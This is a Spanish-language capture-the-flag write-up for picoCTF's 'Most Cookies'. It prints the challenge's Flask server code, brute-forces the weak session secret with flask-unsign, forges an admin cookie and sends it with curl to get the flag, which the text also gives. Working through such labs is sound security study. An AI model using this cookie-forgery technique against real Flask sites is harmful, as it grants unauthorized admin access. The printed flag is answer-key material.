# Most Cookies

## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
## Solución
### Solución:
Lo primero al entrar a la página que nos entregan son 3 posibles "universidades" para aplicar
![[04MostCookies01.png]]

Ahora, ingresamos la sugerencia de cookie que nos dan: 'snickerdoodle'

Entramos, pero no hay flag.
![[04MostCookies02.png]]

Ahora, lo que haremos es analizar el código de server.py que nos entrega la página
```
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
	
... ... ...
... ... ...
```

Tomando el nombre de cada cookie mostrada en el código, vamos a crear un diccionario
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```

Pero antes de realizar el ataque de fuerza bruta, debemos crear un entorno virtual para utilizar flask-unsign
```
──(kali㉿kali)-[/media/sf_almacenamientoCompartido/07_Web4/03-MostCookies]
└─$ python -m venv ~/.venv
       
┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido/07_Web4/03-MostCookies]
└─$ python3 -m venv ~/.venv
       
┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido/07_Web4/03-MostCookies]
└─$ source ~/.venv/bin/activate
```

Ahora sí, usamos flask-unsign, primero para encontrar qué palabra se uso para encriptar la cookie
```
┌──(.venv)─(kali㉿kali)-[/media/sf_almacenamientoCompartido/07_Web4/03-MostCookies]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aajBrA.PWJkhxNXLJPG-Zec60FX5yGl5KI" --wordlist cookies.txt 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'chocolate chip'
```

Vemos que es 'chocolate chip', así que ahora que sabemos esto, es momento de generar una cookie
```
┌──(.venv)─(kali㉿kali)-[/media/sf_almacenamientoCompartido/07_Web4/03-MostCookies]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "chocolate chip"                                                   
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aajCnw.HlVmn5bRzGqO9BcWkqsF369Mdeg
```

Ya por último, toca mandar la cookie al sitio, aplicando un grep para encontrarla pues está escondida en el código
```
┌──(.venv)─(kali㉿kali)-[/media/sf_almacenamientoCompartido/07_Web4/03-MostCookies]
└─$ curl -s http://wily-courier.picoctf.net:64839/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aajCnw.HlVmn5bRzGqO9BcWkqsF369Mdeg" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_e45c084f}</code></p>
 
```

picoCTF{cO0ki3s_yum_e45c084f}
## Notas
En la página del reto de picoCTF ya no se encuentra el archivo .py necesario para realizar el reto, así que yo lo tomé de aquí

https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/Most%20Cookies/server.py